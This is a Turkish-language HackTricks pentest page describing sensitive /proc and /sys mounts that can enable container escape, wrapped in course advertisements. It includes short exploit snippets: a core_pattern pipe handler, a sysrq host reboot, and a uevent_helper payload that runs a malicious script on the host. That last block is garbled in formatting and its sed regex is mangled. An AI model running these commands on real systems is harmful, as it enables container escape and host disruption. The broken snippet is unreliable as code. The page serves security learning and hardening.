# Hassas Montajlar

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

`/proc` ve `/sys`'in uygun ad alanı izolasyonu olmadan açılması, saldırı yüzeyinin genişlemesi ve bilgi sızdırılması gibi önemli güvenlik riskleri oluşturur. Bu dizinler, yanlış yapılandırıldığında veya yetkisiz bir kullanıcı tarafından erişildiğinde, konteyner kaçışına, ana makine değişikliğine veya daha fazla saldırıyı destekleyen bilgilerin sağlanmasına yol açabilecek hassas dosyalar içerir. Örneğin, `-v /proc:/host/proc` yanlış bir şekilde monte edilirse, yol tabanlı doğası nedeniyle AppArmor korumasını atlayabilir ve `/host/proc`'u korumasız bırakabilir.

**Her potansiyel zafiyetin daha fazla detayını** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)** adresinde bulabilirsiniz.**

## procfs Zafiyetleri

### `/proc/sys`

Bu dizin, genellikle `sysctl(2)` aracılığıyla çekirdek değişkenlerini değiştirme erişimi sağlar ve birkaç endişe verici alt dizin içerir:

#### **`/proc/sys/kernel/core_pattern`**

* [core(5)](https://man7.org/linux/man-pages/man5/core.5.html) belgesinde tanımlanmıştır.
* Çekirdek dosyası oluşturulduğunda çalıştırılacak bir program tanımlamaya izin verir; ilk 128 bayt argüman olarak kullanılır. Dosya bir boru `|` ile başlarsa, kod yürütmeye yol açabilir.
*   **Test ve Sömürü Örneği**:

```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Evet # Yazma erişimini test et
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern # Özel işleyici ayarla
sleep 5 && ./crash & # İşleyiciyi tetikle
```

#### **`/proc/sys/kernel/modprobe`**

* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) belgesinde detaylandırılmıştır.
* Çekirdek modül yükleyicisinin yolunu içerir, çekirdek modüllerini yüklemek için çağrılır.
*   **Erişim Kontrolü Örneği**:

```bash
ls -l $(cat /proc/sys/kernel/modprobe) # modprobe erişimini kontrol et
```

#### **`/proc/sys/vm/panic_on_oom`**

* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) belgesinde referans verilmiştir.
* OOM durumu meydana geldiğinde çekirdeğin panik yapıp yapmayacağını kontrol eden bir global bayraktır.

#### **`/proc/sys/fs`**

* [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) belgesine göre, dosya sistemi hakkında seçenekler ve bilgiler içerir.
* Yazma erişimi, ana makineye karşı çeşitli hizmet reddi saldırılarına olanak tanıyabilir.

#### **`/proc/sys/fs/binfmt_misc`**

* Büyü numarasına dayalı olarak yerel olmayan ikili formatlar için yorumlayıcıların kaydedilmesine izin verir.
* `/proc/sys/fs/binfmt_misc/register` yazılabilir olduğunda ayrıcalık yükselmesine veya root shell erişimine yol açabilir.
* İlgili sömürü ve açıklama:
* [Binfmt\_misc üzerinden yetersiz adam rootkit](https://github.com/toffan/binfmt\_misc)
* Derinlemesine eğitim: [Video bağlantısı](https://www.youtube.com/watch?v=WBC7hhgMvQQ)

### Diğerleri `/proc` içinde

#### **`/proc/config.gz`**

* `CONFIG_IKCONFIG_PROC` etkinse çekirdek yapılandırmasını açığa çıkarabilir.
* Saldırganlar için çalışan çekirdekteki zafiyetleri tanımlamak için faydalıdır.

#### **`/proc/sysrq-trigger`**

* Sysrq komutlarını çağırmaya izin verir, bu da hemen sistem yeniden başlatmalarına veya diğer kritik eylemlere neden olabilir.
*   **Ana Makineyi Yeniden Başlatma Örneği**:

```bash
echo b > /proc/sysrq-trigger # Ana makineyi yeniden başlatır
```

#### **`/proc/kmsg`**

* Çekirdek halka tamponu mesajlarını açığa çıkarır.
* Çekirdek sömürüleri, adres sızıntıları ve hassas sistem bilgilerini sağlamaya yardımcı olabilir.

#### **`/proc/kallsyms`**

* Çekirdek tarafından dışa aktarılan sembolleri ve adreslerini listeler.
* Çekirdek sömürü geliştirme için önemlidir, özellikle KASLR'yi aşmak için.
* Adres bilgisi `kptr_restrict` 1 veya 2 olarak ayarlandığında kısıtlanır.
* Detaylar [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) belgesinde.

#### **`/proc/[pid]/mem`**

* Çekirdek bellek cihazı `/dev/mem` ile arayüz sağlar.
* Tarihsel olarak ayrıcalık yükseltme saldırılarına karşı savunmasızdır.
* Daha fazla bilgi için [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) belgesine bakın.

#### **`/proc/kcore`**

* Sistemin fiziksel belleğini ELF çekirdek formatında temsil eder.
* Okuma, ana makine ve diğer konteynerlerin bellek içeriklerini sızdırabilir.
* Büyük dosya boyutu okuma sorunlarına veya yazılım çökmesine yol açabilir.
* Detaylı kullanım için [2019'da /proc/kcore Dökümü](https://schlafwandler.github.io/posts/dumping-/proc/kcore/) bağlantısına bakın.

#### **`/proc/kmem`**

* Çekirdek sanal belleğini temsil eden `/dev/kmem` için alternatif bir arayüzdür.
* Okuma ve yazma işlemlerine izin verir, dolayısıyla çekirdek belleğini doğrudan değiştirmeye olanak tanır.

#### **`/proc/mem`**

* Fiziksel belleği temsil eden `/dev/mem` için alternatif bir arayüzdür.
* Okuma ve yazma işlemlerine izin verir, tüm belleği değiştirmek için sanal adreslerin fiziksel adreslere çözülmesi gerekir.

#### **`/proc/sched_debug`**

* PID ad alanı korumalarını atlayarak süreç zamanlama bilgilerini döndürür.
* Süreç adlarını, kimliklerini ve cgroup tanımlayıcılarını açığa çıkarır.

#### **`/proc/[pid]/mountinfo`**

* Sürecin montaj ad alanındaki montaj noktaları hakkında bilgi sağlar.
* Konteyner `rootfs` veya görüntüsünün konumunu açığa çıkarır.

### `/sys` Zafiyetleri

#### **`/sys/kernel/uevent_helper`**

* Çekirdek cihaz `uevent`'lerini işlemek için kullanılır.
* `/sys/kernel/uevent_helper`'a yazmak, `uevent` tetikleyicileri üzerine rastgele betikler çalıştırabilir.
*   **Sömürü Örneği**: %%%bash

#### Bir yük oluşturur

echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper

#### Konteyner için OverlayFS montajından ana makine yolunu bulur

host\_path=$(sed -n 's/._\perdir=(\[^,]_).\*/\1/p' /etc/mtab)

#### Uevent\_helper'ı kötü niyetli yardımcıya ayarlar

echo "$host\_path/evil-helper" > /sys/kernel/uevent\_helper

#### Bir uevent tetikler

echo change > /sys/class/mem/null/uevent

#### Çıktıyı okur

cat /output %%%

#### **`/sys/class/thermal`**

* Sıcaklık ayarlarını kontrol eder, bu da DoS saldırılarına veya fiziksel hasara neden olabilir.

#### **`/sys/kernel/vmcoreinfo`**

* Çekirdek adreslerini sızdırır, bu da KASLR'yi tehlikeye atabilir.

#### **`/sys/kernel/security`**

* Linux Güvenlik Modüllerinin (AppArmor gibi) yapılandırılmasına izin veren `securityfs` arayüzünü barındırır.
* Erişim, bir konteynerin MAC sistemini devre dışı bırakmasına olanak tanıyabilir.

#### **`/sys/firmware/efi/vars` ve `/sys/firmware/efi/efivars`**

* NVRAM'daki EFI değişkenleri ile etkileşim kurmak için arayüzler açığa çıkarır.
* Yanlış yapılandırma veya sömürü, bozuk dizüstü bilgisayarlara veya başlatılamayan ana makinelerle sonuçlanabilir.

#### **`/sys/kernel/debug`**

* `debugfs`, çekirdeğe "kural yok" hata ayıklama arayüzü sunar.
* Kısıtlanmamış doğası nedeniyle güvenlik sorunları geçmişi vardır.

### Referanslar

* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)
* [Linux Konteynerlerini Anlamak ve Güçlendirmek](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Ayrıcalıklı ve Ayrıcalıksız Linux Konteynerlerini Kötüye Kullanma](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)

<figure><img src="../../../..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'ı takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
